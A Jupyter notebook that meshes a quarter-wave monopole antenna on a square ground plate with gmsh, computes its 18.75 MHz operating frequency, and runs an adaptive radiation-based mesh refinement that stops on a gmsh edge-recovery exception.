In [1]:
from backend.utils.gmsh_function import *
from backend.utils.file_path import *
from backend.utils.h_refinement_loop    import *

In [2]:
name = "Monopole"

# Define the path to save the file
path = setup_save_file_paths(name)

In [3]:
L_plate = 2.0
W_plate = 2.0
Height_monopole = 4.0
W_monopole = 0.04

depart_plate_x = -L_plate / 2
depart_plate_y = -W_plate / 2
depart_plate_z = 0

depart_monopole_x = -W_monopole / 2
depart_monopole_y = 0
depart_monopole_z = 0

light_speed = 3e8
frequency = light_speed / (4 * Height_monopole)
print(f"frequency = {frequency * 1e-06} MHz")
wavelength = light_speed / frequency
print(f"wavelength = {wavelength}")

initial_mesh_size = wavelength / 10
print(f"initial_mesh_size = {initial_mesh_size}")

frequency = 18.75 MHz
wavelength = 16.0
initial_mesh_size = 1.6


In [4]:
gmsh.initialize()
gmsh.model.add("Momopole_Antenna")
setup_performance_config()

plate = gmsh.model.occ.addRectangle(-L_plate / 2, -W_plate / 2, 0, L_plate, W_plate)

# Create the monopole
M_P1 = gmsh.model.occ.addPoint(depart_monopole_x, depart_monopole_y, depart_monopole_z)
M_P2 = gmsh.model.occ.addPoint(depart_monopole_x + W_monopole, depart_monopole_y, depart_monopole_z)
M_P3 = gmsh.model.occ.addPoint(depart_monopole_x + W_monopole, depart_monopole_y, depart_monopole_z + Height_monopole)
M_P4 = gmsh.model.occ.addPoint(depart_monopole_x, depart_monopole_y, depart_monopole_z + Height_monopole)

M_L1 = gmsh.model.occ.addLine(M_P1, M_P2)
M_L2 = gmsh.model.occ.addLine(M_P2, M_P3)
M_L3 = gmsh.model.occ.addLine(M_P3, M_P4)
M_L4 = gmsh.model.occ.addLine(M_P4, M_P1)

Loop_monopole = gmsh.model.occ.addCurveLoop([M_L1, M_L2, M_L3, M_L4])
Surface_monopole = gmsh.model.occ.addPlaneSurface([Loop_monopole])

# Merge the two surfaces
monopole_antenna, _ = gmsh.model.occ.fuse([(2, plate)], [(2, Surface_monopole)])

gmsh.model.occ.synchronize()

generate_and_save_mesh(path.geo, path.msh, initial_mesh_size)

# gmsh.fltk.run()

gmsh.finalize()

[PERFORMANCE] Gmsh configured to utilize 16 threads.
Geometry file saved in data/gmsh_files/Monopole.brep successfully
--- Starting Mesh Optimization (Dim: 2) ---
--- Optimization Complete ---
Mesh file saved in data/gmsh_files/Monopole.msh successfully


In [5]:
extract_msh_to_mat(path.msh, path.mat)

In [6]:
# Mesh refinement setup
grid_points, radius_vicinity = generate_embedded_grid(path.geo, spacing_ratio=0.5)
config = initialize_refinement_config(initial_mesh_size)
view_grid_point(path.geo, grid_points)

[PERFORMANCE] Gmsh configured to utilize 16 threads.
Object diagonal: 4.8990
Fixed spacing (50.0%): 2.4495
Generated 10 points.
Computed r_vicinity: 0.666800
Grid generation complete. Points shape: (10, 3)
Configuration initialized. Max iterations: 3
Mesh size array initialized with uniform size: 1.6
Embedding 10 points into Surface 1...


In [7]:
feed_point = np.array([[0, 0, 0]])

run_radiation_refinement(config, grid_points, radius_vicinity, path, frequency, feed_point, monopole=True)


>>> Starting Iteration 1/3
[PERFORMANCE] Gmsh configured to utilize 16 threads.
[PERFORMANCE] Gmsh configured to utilize 16 threads.


Exception: Unable to recover the edge 17 (1/1) on curve 5 (on surface 1)